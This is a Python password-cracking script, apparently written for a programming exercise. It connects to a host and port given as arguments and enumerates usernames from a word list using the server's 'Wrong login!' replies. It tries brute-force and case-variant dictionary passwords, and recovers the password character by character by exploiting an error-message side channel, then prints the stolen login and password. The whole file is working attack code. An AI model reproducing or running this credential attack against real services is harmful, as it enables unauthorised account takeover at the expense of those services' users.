import sys
import socket
import itertools
import json


def brute_force():
    all_signs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    password_length = 1
    while True:
        for possible_password in itertools.product(all_signs, repeat=password_length):
            possible_password = ''.join(possible_password)

            client_socket.send(possible_password.encode())
            response = client_socket.recv(1024).decode()

            if response == 'Connection success!':
                return possible_password
            elif response == 'Too many attempts':
                return None

        password_length += 1


def gen_of_passwords():
    with open('passwords.txt', 'r', encoding='utf-8') as passwords:
        for password in passwords:
            password = password.strip('\n')
            lower = password.lower()
            upper = password.upper()
            zipped = zip(lower, upper)
            all_combinations = map(''.join, itertools.product(*zipped))
            for combination in all_combinations:
                yield combination


def brute_force_with_dict():
    all_combinations = gen_of_passwords()
    for possible_password in all_combinations:
        client_socket.send(possible_password.encode())
        response = client_socket.recv(1024).decode()

        if response == 'Connection success!':
            return possible_password
        elif response == 'Too many attempts':
            return None


def find_login():
    with open('logins.txt', 'r', encoding='utf-8') as logins:
        for possible_login in logins:
            possible_login = possible_login.rstrip('\n')
            login_password = {"login": possible_login, "password": ""}
            client_socket.send(json.dumps(login_password).encode())

            response = client_socket.recv(1024).decode()
            response = json.loads(response)

            if response["result"] != "Wrong login!":
                return possible_login


def find_password():
    all_signs = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

    password_ = ""

    while True:
        for sign in all_signs:
            possible_password = password_ + sign
            login_password = {"login": login, "password": possible_password}
            client_socket.send(json.dumps(login_password).encode())

            response = client_socket.recv(1024).decode()
            response = json.loads(response)

            if response["result"] == "Connection success!":
                return possible_password
            if response["result"] == "Exception happened during login":
                password_ = possible_password
                break


args = sys.argv

with socket.socket() as client_socket:
    IP_address = args[1]
    port = int(args[2])

    client_socket.connect((IP_address, port))

    login = find_login()
    password = find_password()

    password_and_login = {"login": login, "password": password}
    password_and_login_json = json.dumps(password_and_login)
    print(password_and_login_json)
